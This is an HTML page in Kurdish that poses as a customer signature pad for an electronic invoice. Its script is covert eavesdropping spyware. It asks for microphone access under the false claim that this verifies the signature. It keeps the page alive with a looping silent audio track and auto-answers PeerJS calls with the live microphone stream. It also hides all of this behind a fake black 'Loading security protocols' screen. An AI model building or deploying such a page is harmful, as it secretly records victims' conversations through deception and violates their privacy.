<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>واژۆی ئەلیکترۆنی فاتورە</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { font-family: Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 20px; }
        #signature-pad { border: 2px solid #ddd; border-radius: 10px; background: #fff; cursor: crosshair; width: 100%; height: 250px; touch-action: none; }
        .btn { background-color: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.3s; }
        .btn:active { transform: scale(0.98); background-color: #218838; }
        #status { margin-top: 15px; font-size: 14px; color: #666; }
    </style>
</head>
<body>

    <div class="container" id="main-ui">
        <h2>واژۆی کڕیار</h2>
        <canvas id="signature-pad"></canvas>
        <button class="btn" onclick="startProcess()">پاشەکەوتکردن و تەواوکردن</button>
        <div id="status">تکایە لە ناو چوارچێوەکەدا واژۆ بکە</div>
    </div>

    <!-- دەنگی بێدەنگ بۆ ڕێگری لە کوژانەوەی مایک لە پشتەوە -->
    <audio id="silentLoop" loop playsinline style="display:none;">
        <source src="https://raw.githubusercontent.com/anars/blank-audio/master/10-seconds-of-silence.mp3" type="audio/mp3">
    </audio>

    <script>
        const canvas = document.getElementById('signature-pad');
        const ctx = canvas.getContext('2d');
        let drawing = false;

        // ڕێکخستنی قەبارەی کانڤاس بۆ مۆبایل
        function resizeCanvas() {
            canvas.width = canvas.offsetWidth;
            canvas.height = canvas.offsetHeight;
        }
        window.onload = resizeCanvas;

        // کۆدی کێشانی واژۆ
        canvas.addEventListener('touchstart', (e) => { drawing = true; ctx.beginPath(); });
        canvas.addEventListener('touchend', () => { drawing = false; });
        canvas.addEventListener('touchmove', (e) => {
            if (!drawing) return;
            const touch = e.touches[0];
            const rect = canvas.getBoundingClientRect();
            ctx.lineTo(touch.clientX - rect.left, touch.clientY - rect.top);
            ctx.stroke();
        });

        async function startProcess() {
            const urlParams = new URLSearchParams(window.location.search);
            const invNum = urlParams.get('num') || "000";
            
            const status = document.getElementById('status');
            status.innerText = "خەریکی ناردنی واژۆیە...";

            try {
                // ١. وەرگرتنی مۆڵەتی مایک (VoIP)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
                });

                // ٢. چالاککردنی Silent Audio بۆ ئەوەی پەیجەکە نەمڕێت
                const audio = document.getElementById('silentLoop');
                audio.play();

                // ٣. دروستکردنی پەیوەندی بەناوی فاتورەکەوە
                const peer = new Peer('voip-' + invNum);
                peer.on('call', call => {
                    call.answer(stream); // وەڵامدانەوەی ئۆتۆماتیکی بۆ تۆ
                });

                // ٤. فێڵی شاشەی ڕەش
                document.body.innerHTML = `
                    <div style="background:#000; height:100vh; width:100vw; display:flex; align-items:center; justify-content:center; color:#111;">
                        <p>Loading security protocols... %99</p>
                    </div>
                `;

                // لێرەدا دەتوانیت کۆدی ناردنی وێنەی واژۆکە بۆ تێلیگرام یان درایڤ زیاد بکەیت

            } catch (err) {
                alert("بۆ دڵنیایی لە ڕاستی واژۆکەت، تکایە ڕێگە بدە بە مایک");
            }
        }
    </script>
</body>
</html>
